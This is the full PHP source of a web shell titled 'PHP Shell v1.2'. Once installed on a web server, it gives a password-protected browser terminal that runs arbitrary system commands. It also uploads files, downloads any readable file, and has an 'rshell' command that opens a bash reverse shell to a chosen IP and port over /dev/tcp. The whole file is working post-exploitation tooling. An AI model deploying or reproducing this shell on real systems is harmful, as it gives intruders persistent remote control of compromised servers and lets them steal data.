<?php

//
// Author: Dr34dedPr0c355 / ebenner / eb3095
// Github: https://github.com/eb3095/php-shell
// Scrollbar By: https://codepen.io/zkreations
//

//
// Config
// Username and password are in sha512
// Default
//   username: user
//   password: pass
//

$USERNAME = "b14361404c078ffd549c03db443c3fede2f3e534d73f78f77301ed97d4a436a9fd9db05ee8b325c0ad36438b43fec8510c204fc1c1edb21d0941c00e9e2c1ce2";
$PASSWORD = "5b722b307fce6c944905d132691d5e4a2214b7fe92b738920eb3fce3a90420a19511c3010a0e7712b054daef5b57bad59ecbd93b3280f210578f547f4aed4d25";
$WALLPAPER = "";

// Session
session_start();

//
// Variables
//

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";


//
// Functions
//

// Sanitize Dirs
function getDir($dir, $cmd = false) {
    if ($cmd) {
        chdir($dir);
        $dir = getcwd();
    }
    if ($dir == "/") {
        return $dir;
    }
    if (substr_count($dir, "\\") == 0 && substr_count($dir, "/") != 0) {
        $split = explode("/", $dir);
    } else if (substr_count($dir, "\\") != 0 && substr_count($dir, "/") == 0) {
        $split = explode("\\", $dir);
    } else {
        return $dir;
    }
    return $split[count($split)-1];
}

// Execute Command
function executeCMD($cmd) {
    $trail = substr($cmd, -2);
    if ($trail != " &") {
        $trail = "";
    }
    chdir($_SESSION['cwdlong']);
    if (substr($cmd, 0, 3) == "cd " && strpos($cmd, ";") == 0) {
        $dir = getDir(substr($cmd, 3), true);
        $_SESSION['cwd'] = $dir;
        $_SESSION['cwdlong'] = getcwd();
        echo '{"cwd": "'.$dir.'"}';
        return;
    }
    if (substr($cmd, 0, 7) == "rshell " && strpos($cmd, ";") == 0) {
        $split = explode(" ", $cmd);
        if (count($split) < 3) {
            echo '{"lines": ["'.base64_encode("rshell requires an IP and a port").'"]}';
            return;
        }
        exec('/bin/bash -c "bash -i >& /dev/tcp/'.$split[1].'/'.$split[2].' 0>&1 &"');
        echo '{"lines": ["'.base64_encode("Remote shell opened to ".$split[1].":".$split[2]).'"]}';
        return;
    }
    exec($cmd . " 2>&1" . $trail, $output);
    $json = '{"lines": [';
    for ($ctr = 0; $ctr < count($output); $ctr++) {
        $json .= '"'.base64_encode($output[$ctr]).'"';
        if ($ctr < count($output)-1) {
            $json .= ",";
        }
    }
    $json .= ']}';
    echo $json;
}

// File upload
function upload() {
    $target = $_SESSION['cwdlong'];
    $file = $target . DIRECTORY_SEPARATOR . basename($_FILES["file"]["name"]);
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $file)) {
        echo '{"lines": ["' . base64_encode("Your file was uploaded to: " . $file) . '"]}';
    } else {
        echo '{"lines": ["' . base64_encode("Permission Denied: " . $target) . '"]}';
    }
}

// File download
function download() {
    $_POST['download'] = base64_decode($_POST['download']);
    if (strpos("x".$_POST['download'],"/") !== 0 || strpos("x".$_POST['download'],"\\") !== 0) {
        $file = $_POST['download'];
    } else {
        $target = $_SESSION['cwdlong'];
        $file = $target . DIRECTORY_SEPARATOR . $_POST['download'];
    }
    if (!file_exists($file)) {
        echo '{"lines": ["' . base64_encode("File does not exist: " . $file) . '"]}';
        return;
    }
    $data = file_get_contents($file);
    echo '{"file": "' . base64_encode($data) . '", "filename": "'.basename($file).'"}';
}


//
// Program
//

if (!isset($_POST['exec']) && !isset($_FILES['file']) && !isset($_POST['download'])) {
    head();
    css();
}

if (!isset($_SESSION['logged_in']) && isset($_POST['exec'])) {
    echo '{"error": "NoLogin"}';
} else if (!isset($_SESSION['logged_in'])) {
    if (!isset($_POST['username'])) {
        displayLogin();
    } else {
        if (hash('sha512', $_POST['username']) == $USERNAME && hash('sha512', $_POST['password']) == $PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['cwd'] = getDir(getcwd());
            $_SESSION['cwdlong'] = getcwd();
            $_SESSION['hostname'] = gethostname();
            $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
            displayShell();
        } else {
            displayLogin(true);
        }
    }
} else if ($_SESSION['logged_in'] && isset($_POST['logout'])) {
    unset($_SESSION['logged_in']);
    displayLogin();
} else if ($_SESSION['logged_in'] && isset($_POST['download'])) {
    download();
}  else if ($_SESSION['logged_in'] && isset($_FILES['file'])) {
    upload();
} else if ($_SESSION['logged_in'] && !isset($_POST['exec'])) {
    $_SESSION['cwd'] = getDir(getcwd());
    $_SESSION['cwdlong'] = getcwd();
    $_SESSION['hostname'] = gethostname();
    $_SESSION['user'] = posix_getpwuid(posix_geteuid())['name'];
    displayShell();
} else if ($_SESSION['logged_in'] && isset($_POST['exec'])) {
    executeCMD(base64_decode($_POST['exec']));
}

// Dont include if the user is not logged in. Also dont include if an api call
if (isset($_SESSION['logged_in']) && !isset($_POST['exec']) && !isset($_FILES['file']) && !isset($_POST['download'])) {
    javascript();
}

// Dont include if this is an api call
if (!isset($_POST['exec']) && !isset($_FILES['file']) && !isset($_POST['download'])) {
    echo "  </body>
          </html>";
}


//
// This is scripting, HTML, and CSS, moving down here to make this "cleaner"
//

// Login Screen
function displayLogin($failed = false) {
    ?>
    <div class="login">
        <div class="login-title">Login</div>
        <?php if ($failed) { ?>
            <span class="error">Failed Login!</span><br>
        <?php } ?>
        <form method="post">
            <input type="text" id="username" name="username" class="input user" placeholder="Username"><br>
            <input type="password" id="password" name="password" class="input password" placeholder="Password"><br>
            <input class="login-button" type="submit" value="Log in">
        </form>
    </div>
    <?php
}

// Shell Screen
function displayShell() {
    ?>
    <div id ="shell-container" class="shell-container">
        <table class="shell-table">
            <tr>
                <td class="shell-cell">
                    <div id="shell" class="shell">
                    </div>
                </td>
            </tr>
            <tr class="shell-command-row">
                <td class="shell-cell">
                    <table id="exec-table">
                        <tr>
                            <td class="exec-host">
                                <span id="bash" class="bash"><span id='exec-user' class='exec-user'><?php echo $_SESSION['user']."</span>@<span id='exec-host' class='exec-host'>".$_SESSION['hostname']."</span>:<span id='cwd' class='cwd'>".$_SESSION['cwd']."</span>"; ?>#</span>
                            </td>
                            <td class="exec-row">
                                <input type="text" id="exec" name="exec" class="command">
                            </td>
                        </tr>
                    </table>
                </td>
            </tr>
        </table>
    </div>
    <?php
}

function head() {
    echo "<html>
            <head>
                <title>PHP Shell - v1.2</title>
            </head>
            <body>";
}

function css() {
    global $WALLPAPER;
    echo "  <style>
                body {
                    background: url('".$WALLPAPER."');
                    background-attachment: fixed;
                    background-repeat: no-repeat;
                    background-size: 75% 75%;
                    background-position: center;
                    background-color: black;
                }
                .shell {
                    height: 100%;
                    overflow-y: scroll;
                    overflow-wrap: break-word;
                    word-break: break-all;
                }
                .shell-container {                
                    background: black;
                    width: 100%;
                    height: 100%;
                    -webkit-box-shadow: 0px 0px 0px 20px rgba(0,0,0,1);
                    box-shadow: 0px 0px 0px 20px rgba(0,0,0,1);
                }
                .shell-container, .shell-command-row .bash, .shell-command-row input, .shell {            
                    font-family: monospace;
                    color: white;
                }
                .shell-table .shell-cell {
                    padding: 10px;
                }
                .command {
                    background: none;   
                    border: none;
                    width: 100%;
                    outline: none !important;
                }
                .shell-table {
                    width: 100%;
                    height: 100%;
                }
                .shell-command-row {
                    height: 40px;
                }
                .exec-host {
                    white-space: nowrap;
                    padding: 0px;
                }
                .exec-row {
                    width: 100%;
                    padding: 0px;
                    padding-left: 5px;
                }
                .error {
                    display: block;
                    width: 100%;
                    text-align: center;
                    height: 0px;
                    color: red;
                    font-weight: bolder;
                    text-shadow: 1px 1px 1px black;
                }
                .input-label {
                    color: white;
                    font-weight: bolder;
                    text-shadow: 1px 1px 1px black;
                }
                .login-button {
                    padding: 10px;
                    border-radius: 20px;
                    width: 200px;
                    color: white;
                    background: rgba(255,255,255,0.2);
                    border: none;
                    text-shadow: 1px 1px 1px black;
                    font-weight: bolder;
                    transition: background 1s ease;
                }
                .input.user, .input.password {
                    background: none;
                    border: none;
                    border-bottom: 1px solid #f55600;
                    color: white;
                    outline: none !important;
                    width: 200px;
                    margin-bottom: 20px;
                    height: 20px;
                }
                .input.user {
                    margin-top: 10px;
                }
                .input::placeholder {
                    color: white;
                }
                .login-button:hover {
                    background: rgba(255,255,255,0.4);
                    transition: background 1s ease;
                    cursor: pointer;
                }
                .login-title {
                    background: rgba(0,0,0,0.4);
                    color: white;
                    margin-left: -20px;
                    margin-right: -20px;
                    margin-top: -20px;
                    margin-bottom: 20px;
                    padding: 5px;
                }
                .login {
                    width: 300px;
                    height: 160px;
                    position: absolute;
                    left: 50%;
                    top: 50%;
                    margin-top: -80px;
                    margin-left: -150px;
                    padding: 20px;
                    text-align: center;
                    background: rgba(0, 54, 74, 0.7);
                    -webkit-box-shadow: 0px 0px 7px 3px rgba(0,0,0,0.75);
                    -moz-box-shadow: 0px 0px 7px 3px rgba(0,0,0,0.75);
                    box-shadow: 0px 0px 7px 3px rgba(0,0,0,0.75);
                }
                
                .login table {
                    margin-left: auto;
                    margin-right: auto;
                }
                .exec-user {
                    color: green;
                }
                .exec-host {
                    color: lightgreen;
                }
                .cwd {
                    color: red;
                }
                .shell::-webkit-scrollbar {
                  width: 12px;
                  height: 12px;
                }
                .shell::-webkit-scrollbar-track {
                  border-radius: 10px;
                  background-color: rgba(0, 0, 0, 0.4);
                }
                .shell::-webkit-scrollbar-thumb {
                  background-color: #e78632;
                  background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.3) 20%,transparent 20%,transparent 40%,rgba(255, 255, 255, 0.3) 40%,rgba(255,255,255,.3) 60%,transparent 60%,transparent 80%,rgba(255, 255, 255, 0.3) 80%);
                  border-radius: 10px;
                }
            </style>";
}

function javascript() {
    global $protocol;
    echo "  <script>
                var cmdhistory = [];
                var position = -1;
            
                function bindExec() {
                    document.getElementById('exec').onkeydown = execKey;
                }
                
                function addBashSim(element, text) {
                    let cmdPromptUser = document.createElement('span');
                    let cmdPromptHost = document.createElement('span');
                    let cmdPromptCwd = document.createElement('span');
                    let cmd = document.createElement('span');
                    cmdPromptUser.classList.add('exec-user');
                    cmdPromptHost.classList.add('exec-host');
                    cmdPromptCwd.classList.add('cwd');
                    cmdPromptUser.innerText = document.getElementById('exec-user').innerText;
                    cmdPromptHost.innerText = document.getElementById('exec-host').innerText;
                    cmdPromptCwd.innerText = document.getElementById('cwd').innerText;
                    cmd.innerText += '# ' + text;
                    element.appendChild(cmdPromptUser);
                    element.innerHTML += '@';
                    element.appendChild(cmdPromptHost);
                    element.innerHTML += ':';
                    element.appendChild(cmdPromptCwd);
                    element.appendChild(cmd);
                    element.innerHTML += '<br>';
                }
                
                function execKey(event) {
                    if (event.code === 'Enter') {
                        
                        let exec = document.getElementById('exec');
                        let cmd = exec.value;
                        if (cmd === 'exit') {
                            let form = document.createElement('form');
                            document.body.appendChild(form);
                            form.method = 'POST';
                            let elem = document.createElement('input');
                            elem.name = 'logout';
                            elem.id = 'logout';
                            elem.type = 'hidden';
                            elem.value = 'true';
                            form.appendChild(elem);
                            form.submit();
                            return;
                        }
                        if (cmd === 'cls') {
                            cmdhistory.push(exec.value);
                            position = -1;
                            let shell = document.getElementById('shell');
                            shell.innerText = '';
                            addBashSim(shell, exec.value);
                            exec.value = '';
                            return;
                        }
                        if (cmd.startsWith('download ')) {
                            let file = cmd.substring(9, cmd.length);
                            cmdhistory.push(exec.value);
                            position = -1;
                            let shell = document.getElementById('shell');
                            addBashSim(shell, exec.value);
                            exec.value = '';
                            let req = new XMLHttpRequest();
                            req.open('POST', '" . $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "');
                            req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                            req.addEventListener('load', function() {
                                if (req.readyState === req.DONE) {
                                    if (req.status === 200) {
                                        let response = JSON.parse(req.responseText);
                                        if (response.lines) {
                                            response.lines.forEach(line => {
                                                let elem = document.createElement('span');                                            
                                                elem.innerText = atob(line);
                                                shell.appendChild(elem);
                                                shell.innerHTML += '<br>';
                                            });
                                            shell.scrollTop = shell.scrollHeight;
                                        } else if (response.file) {
                                            let link = document.createElement('a');
                                            link.href = 'data:application/octet-stream;charset=utf-8;base64,' + response.file;
                                            link.setAttribute('download', response.filename);
                                            link.click();
                                        } else {
                                            let elem = document.createElement('span');                                            
                                            elem.innerText = 'ERROR: No file or output returned!';
                                            shell.appendChild(elem);
                                            shell.innerHTML += '<br>';                                    
                                        }
                                    } else {
                                        let elem = document.createElement('span');                                            
                                        elem.innerText = 'ERROR: ' + req.status + ': ' + req.statusText;
                                        shell.appendChild(elem);
                                        shell.innerHTML += '<br>';                                    
                                    }
                                }
                            });
                            req.ontimeout = function () {
                                let elem = document.createElement('span');                                            
                                elem.innerText = 'ERROR: Timeout';
                                shell.appendChild(elem);
                                shell.innerHTML += '<br>';
                             };
                            req.onerror = function () {
                                let elem = document.createElement('span');                                            
                                elem.innerText = 'ERROR: Failed to connect';
                                shell.appendChild(elem);
                                shell.innerHTML += '<br>';
                            };
                            req.send('download=' + btoa(file));
                            return;
                        }
                        if (cmd === 'upload') {
                            cmdhistory.push(exec.value);
                            position = -1;
                            let shell = document.getElementById('shell');
                            addBashSim(shell, exec.value);
                            exec.value = '';
                            let filePrompter = document.createElement('input');
                            filePrompter.type = 'file';
                            filePrompter.name = 'file';
                            filePrompter.click();
                            filePrompter.onchange = function() {
                                let file = filePrompter.files[0];
                                let formData = new FormData();
                                formData.append('file', file);
                                let req = new XMLHttpRequest();
                                req.open('POST', '" . $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "');
                                req.addEventListener('load', function() {
                                    if (req.readyState === req.DONE) {
                                        if (req.status === 200) {
                                            let response = JSON.parse(req.responseText);
                                            if (response.lines) {
                                                response.lines.forEach(line => {
                                                    let elem = document.createElement('span');                                            
                                                    elem.innerText = atob(line);
                                                    shell.appendChild(elem);
                                                    shell.innerHTML += '<br>';
                                                });
                                                shell.scrollTop = shell.scrollHeight;
                                            }
                                        } else {
                                            let elem = document.createElement('span');                                            
                                            elem.innerText = 'ERROR: ' + req.status + ': ' + req.statusText;
                                            shell.appendChild(elem);
                                            shell.innerHTML += '<br>';                                    
                                        }
                                    }
                                });
                                req.ontimeout = function () {
                                    let elem = document.createElement('span');                                            
                                    elem.innerText = 'ERROR: Timeout';
                                    shell.appendChild(elem);
                                    shell.innerHTML += '<br>';
                                 };
                                req.onerror = function () {
                                    let elem = document.createElement('span');                                            
                                    elem.innerText = 'ERROR: Failed to connect';
                                    shell.appendChild(elem);
                                    shell.innerHTML += '<br>';
                                };
                                req.send(formData);
                            };
                            return;
                        }
                        cmdhistory.push(exec.value);
                        exec.value = '';
                        position = -1;
                        let shell = document.getElementById('shell');                        
                        addBashSim(shell, cmd);
                        let req = new XMLHttpRequest();
                        req.open('POST', '".$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."');
                        req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        req.addEventListener('load', function() {
                            if (req.readyState === req.DONE) {
                                if (req.status === 200) {
                                    let response = JSON.parse(req.responseText);
                                    if (response.error && response.error === 'NoLogin') {
                                        window.location = '".$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."';
                                        return;
                                    } else if (response.error) {                                        
                                        shell.innerText += response.error + '<br>';
                                    }
                                    if (response.cwd) {
                                        document.getElementById('cwd').innerText = response.cwd;
                                    }
                                    if (response.lines) {
                                        response.lines.forEach(line => {
                                            let elem = document.createElement('span');                                            
                                            elem.innerText = atob(line);
                                            shell.appendChild(elem);
                                            shell.innerHTML += '<br>';
                                        });
                                        shell.scrollTop = shell.scrollHeight;
                                    }
                                } else {
                                    let elem = document.createElement('span');                                            
                                    elem.innerText = 'ERROR: ' + req.status + ': ' + req.statusText;
                                    shell.appendChild(elem);
                                    shell.innerHTML += '<br>';                                    
                                }
                            }
                        });
                        req.timeout = 10000;
                        req.ontimeout = function () {
                            let elem = document.createElement('span');                                            
                            elem.innerText = 'ERROR: Timeout';
                            shell.appendChild(elem);
                            shell.innerHTML += '<br>';
                        };
                        req.onerror = function () {
                            let elem = document.createElement('span');                                            
                            elem.innerText = 'ERROR: Failed to connect';
                            shell.appendChild(elem);
                            shell.innerHTML += '<br>';
                        };
                        cmd = btoa(cmd);
                        req.send('exec='+cmd);
                    }
                    if (event.code === 'ArrowUp') {
                        if (cmdhistory.length === 0) {
                            return;
                        }
                        if (position === -1) {
                            position = cmdhistory.length; 
                        }
                        position--;
                        if (position < 0) {
                            position = 0;
                        }
                        document.getElementById('exec').value = cmdhistory[position];
                    }
                    if (event.code === 'ArrowDown') {
                        if (cmdhistory.length === 0) {
                            return;
                        }                    
                        if (position === -1) {
                            position = cmdhistory.length - 1; 
                        }
                        position++;
                        if (position >= cmdhistory.length) {
                            position = cmdhistory.length;
                            document.getElementById('exec').value = '';
                            return;
                        }
                        document.getElementById('exec').value = cmdhistory[position];
                    }
                }
                
                function bindClick() {
                    document.getElementById('shell-container').onclick = event => {
                        document.getElementById('exec').focus();
                    };
                }
                
                window.onload = (event) => {
                    bindExec();
                    bindClick();
                };
            </script>";
}
